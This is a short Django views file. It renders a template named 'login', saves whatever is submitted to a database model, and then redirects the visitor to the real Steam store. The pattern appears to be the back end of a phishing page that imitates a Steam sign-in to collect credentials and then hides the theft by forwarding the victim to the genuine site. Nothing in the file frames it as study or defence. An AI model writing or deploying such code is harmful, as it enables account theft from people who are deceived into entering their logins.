from django.shortcuts import render, redirect
from .models import Form
from .form import FormForm

# Create your views here.
def create(request):
    if request.method=='POST':
        form = FormForm(request.POST)
        if form.is_valid():
            form.save()
        return redirect('https://store.steampowered.com/')
    else:
        form = FormForm()

    return render(request, 'login', {'form': form})
